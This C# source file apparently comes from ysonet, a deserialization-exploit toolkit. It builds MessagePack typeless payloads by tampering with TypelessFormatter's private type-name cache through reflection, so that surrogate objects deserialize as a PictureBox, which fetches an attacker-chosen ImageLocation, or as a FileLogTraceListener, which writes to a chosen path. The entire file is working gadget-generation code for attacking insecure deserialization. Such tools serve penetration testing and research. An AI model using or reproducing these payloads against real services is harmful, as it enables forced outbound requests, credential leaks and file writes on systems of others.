namespace ysonet.Helpers
{
    using MessagePack;
    using MessagePack.Formatters;
    using MessagePack.Resolvers;
    using System;
    using System.Reflection;

    /// <summary>
    /// Builds the property-setter non-RCE gadgets without constructing the live target type.
    /// MessagePack serializes a target-shaped surrogate, while the typeless name cache emits the
    /// framework type name that the target deserializer will instantiate.
    /// </summary>
    internal static class MessagePackNonRceGadgetHelper
    {
        internal static byte[] CreatePictureBox(string imageLocation, bool useLz4)
        {
            SwapTypeCacheName(
                typeof(PictureBoxSurrogate),
                "System.Windows.Forms.PictureBox, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");

            return Serialize(
                new PictureBoxSurrogate
                {
                    WaitOnLoad = true,
                    ImageLocation = imageLocation
                },
                useLz4);
        }

        internal static byte[] CreateFileLogTraceListener(string customLocation, bool useLz4)
        {
            SwapTypeCacheName(
                typeof(FileLogTraceListenerSurrogate),
                "Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");

            return Serialize(
                new FileLogTraceListenerSurrogate
                {
                    CustomLocation = customLocation
                },
                useLz4);
        }

        internal static void Test(byte[] serializedData, bool useLz4)
        {
            MessagePackSerializer.Deserialize<object>(serializedData, Options(useLz4));
        }

        private static byte[] Serialize(object value, bool useLz4)
        {
            return MessagePackSerializer.Serialize(value, Options(useLz4));
        }

        private static MessagePackSerializerOptions Options(bool useLz4)
        {
            return useLz4
                ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
                : TypelessContractlessStandardResolver.Options;
        }

        private static void SwapTypeCacheName(Type surrogateType, string targetAssemblyQualifiedName)
        {
            FieldInfo cacheField = typeof(TypelessFormatter).GetField(
                "FullTypeNameCache",
                BindingFlags.NonPublic | BindingFlags.Static);
            object cache = cacheField.GetValue(TypelessFormatter.Instance);
            MethodInfo tryAdd = cacheField.FieldType.GetMethod(
                "TryAdd",
                new[] { typeof(Type), typeof(byte[]) });

            tryAdd.Invoke(
                cache,
                new object[]
                {
                    surrogateType,
                    System.Text.Encoding.UTF8.GetBytes(targetAssemblyQualifiedName)
                });
        }
    }

    internal sealed class PictureBoxSurrogate
    {
        // Order is significant: PictureBox loads only when WaitOnLoad is already true.
        public bool WaitOnLoad { get; set; }
        public string ImageLocation { get; set; }
    }

    internal sealed class FileLogTraceListenerSurrogate
    {
        public string CustomLocation { get; set; }
    }
}
